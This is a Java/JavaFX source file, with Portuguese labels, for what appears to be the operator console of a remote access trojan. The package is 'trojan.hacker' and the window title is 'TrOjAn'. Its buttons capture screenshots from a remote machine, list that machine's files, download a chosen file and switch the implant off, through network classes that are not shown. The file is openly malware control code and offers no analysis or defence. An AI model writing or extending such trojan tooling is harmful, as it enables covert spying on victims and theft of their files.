/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package trojan.hacker;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.layout.GridPane;
import javafx.stage.Stage;
import javafx.scene.image.ImageView;
import network.*;

/**
 *
 * @author UserPL022Pc01
 */
public class Main extends Application {
    
    String ftpNum;
    RecieveArray ra;

    @Override
    public void start(Stage primaryStage) throws IOException {    

        Button btnTakePic = new Button(),
                btnFTP = new Button(),
                btnAccept = new Button(),
                btnStop = new Button();
        Label lblNum = new Label("Nº do ficheiro: "), 
                lblFTP = new Label("");
        TextField txFTP = new TextField();
        ImageView imv = new ImageView();
        Image screen = new Image("file:Screenshot.jpg");
        imv.setImage(screen);
        imv.setFitHeight(500);
        imv.setFitWidth(1000);

        btnTakePic.setText("Tirar screenshot"); //FEITO
        btnTakePic.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                try {
                    RecieveScreenshot rs = new RecieveScreenshot();
                    imv.setImage(screen);
                } catch (IOException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        });

        btnFTP.setText("Listar ficheiros"); //FEITO
        btnFTP.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                RecieveArray ra = new RecieveArray();
                lblFTP.setText(ra.array);
            }
        });

        btnAccept.setText("Download"); //FEITO
        btnAccept.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                ftpNum = txFTP.getText();
                
                SendNum sn = new SendNum(Integer.parseInt(ftpNum));
                try {
                    RecieveFile cf = new RecieveFile();
                } catch (IOException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                }
                System.out.println("Ficheiro recebido");
            }
        });
        
        btnStop.setText("Desligar"); //FEITO
        btnStop.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                SendComOff sco = new SendComOff();
                Stage stage = (Stage) btnStop.getScene().getWindow();
                stage.close();
            }
        });

        GridPane root = new GridPane();
        root.add(btnTakePic, 1, 0);
        root.add(btnFTP, 1, 1);
        root.add(lblFTP, 1, 2);
        root.add(lblNum, 0, 3);
        root.add(txFTP, 1, 3);
        root.add(btnAccept, 2, 3);
        root.add(imv, 3, 3);
        root.add(btnStop, 1, 4);

        root.setVgap(10);
        root.setHgap(10);

        Scene scene = new Scene(root, 1600, 900);

        primaryStage.setTitle("TrOjAn");
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        launch(args);
    }

}
